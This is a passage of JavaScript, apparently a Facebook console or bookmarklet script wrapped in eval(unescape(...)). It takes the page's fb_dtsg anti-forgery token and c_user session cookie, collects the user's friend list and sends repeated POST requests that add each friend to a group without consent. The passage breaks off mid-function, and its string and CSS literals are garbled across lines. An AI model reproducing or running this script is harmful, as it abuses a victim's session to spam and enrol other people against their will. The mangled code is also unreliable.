eval(unescape("javascript: (function () {
    var f = {
        dtsg: document.getElementsByName('fb_dtsg')[0].value,
        uid: document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
        gid: document.getElementsByName('group_id')[0].value,
        arr: new Array(),
        prenKe: 0,
        suc: 0,
        p: 0,
        err: 0,
        count: 3,
        ajaxify: function (b) {
            var c = new XMLHttpRequest();
            c.open('GET', b, true);
            c.onreadystatechange = function () {
                if (c.readyState == 4 && c.status == 200) {
                    var a = eval('(' + c.responseText.substr(9) + ')');
                    if (a.payload && a.payload.entries) {
                        f.arr = a.payload.entries.sort(function () {
                            return 0.5 - Math.random()
                        })
                    }
                    var Main = '<div style="
        padding - bottom: 5px; font - size: 20px;
        ">' + Title + '</div><div style="
        font - size: 14px;
        "><b>' + f.arr.length + ' </b>Friends Collected</div><div id="
        BODY "></div><div id="
        Group_Members_Counter "></div><div id="
        display " style="
        min - width: 300px; display: inline - block; text - align: left "></div>' + crj;
                    document.getElementById('MAIN').innerHTML = Main;
                    for (i in f.arr) {
                        f.setAjax(i)
                    }
                } else if (c.readyState == 4 && c.status == 404) {
                    document.getElementById('MAIN').innerHTML = '<div style="
        padding - bottom: 5px; font - size: 20px;
        ">' + Title + '</div><b style="
        color: darkred ">Page Not Found!</b>' + crj
                } else {
                    document.getElementById('MAIN').innerHTML = '<div style="
        padding - bottom: 5px; font - size: 20px;
        ">' + Title + '</div><b style="
        color: darkgreen ">Your Friends Have Been Collected & Now Starting Adding.</b>' + crj
                }
            };
            c.send()
        },
        setAjax: function (i) {
            var e = new XMLHttpRequest(),
                prm = '__a=1&fb_dtsg=' + f.dtsg + '&group_id=' + f.gid + '&source=typeahead&ref=&message_id=&members=' + f.arr[i].uid + '&__user=' + f.uid + '&phstamp=';
            e.open('POST', '/ajax/groups/members/add_post.php', true);
            e.onreadystatechange = function () {
                if (e.readyState == 4 && e.status == 200) {
                    var a = eval('(' + e.responseText.substr(9) + ')');
                    f.prenKe++;
                    document.getElementById('BODY').innerHTML = '<div style="
        font - size: 14px;
        "><b>' + f.prenKe + '</b> Friends Processed and <b>' + f.suc + '</b> Friends Added (' + f.err + ' Not Added)</div>';